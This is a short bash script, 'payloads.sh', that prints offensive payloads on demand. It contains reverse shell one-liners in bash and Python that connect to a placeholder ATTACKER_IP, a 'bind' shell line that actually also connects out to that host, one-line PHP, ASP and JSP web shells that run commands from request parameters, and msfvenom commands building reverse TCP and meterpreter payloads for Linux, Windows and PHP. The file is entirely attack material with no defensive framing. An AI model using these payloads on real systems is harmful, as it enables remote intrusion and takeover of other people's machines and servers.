#!/bin/bash
# payloads.sh - Quick payload generator
# Usage: ./payloads.sh <type>

TYPE=${1:-reverse}

echo "=== Payload Generator: $TYPE ==="

case $TYPE in
    reverse)
        echo "=== Reverse Shell (Bash) ==="
        echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
        echo ""
        echo "=== Python ==="
        echo 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'
        ;;
    bind)
        echo "=== Bind Shell (Bash) ==="
        echo "bash -i -p -s </dev/tcp/ATTACKER_IP/PORT 0>&1"
        ;;
    webshell)
        echo "=== Web Shells ==="
        echo "PHP: <?php system(\$_GET['cmd']); ?>"
        echo "ASP: <% eval request(\"cmd\") %>"
        echo "JSP: <% Runtime.getRuntime().exec(request.getParameter(\"cmd\")) %>"
        ;;
    msf)
        echo "=== MSFVENOM Examples ==="
        echo "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf"
        echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe"
        echo "msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php"
        ;;
    *)
        echo "Types: reverse, bind, webshell, msf"
        ;;
esac